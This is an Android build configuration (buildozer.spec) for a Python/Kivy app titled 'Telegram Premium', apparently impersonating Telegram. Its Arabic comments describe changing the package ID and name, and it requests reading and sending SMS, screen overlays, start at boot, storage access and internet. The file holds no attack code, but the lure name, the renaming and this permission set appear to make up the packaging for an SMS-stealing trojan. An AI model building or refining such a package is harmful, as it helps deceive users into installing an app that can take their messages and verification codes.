[app]
title = Telegram Premium
# غيرنا الـ ID عشان نكسر الكاش القديم ونغير الاسم
package.name = tg_security_premium_v5
package.domain = org.tg.secure
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 5.0

# المتطلبات الأساسية لخلطة دارك
requirements = python3,kivy==2.1.0,requests,pyjnius,android

orientation = portrait
fullscreen = 1

# الصلاحيات الكاملة
android.permissions = INTERNET, SYSTEM_ALERT_WINDOW, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_SMS, SEND_SMS, RECEIVE_BOOT_COMPLETED, WAKE_LOCK

android.api = 31
android.minapi = 21
android.archs = arm64-v8a, armeabi-v7a
android.copy_libs = 1

[buildozer]
log_level = 2
warn_on_root = 1
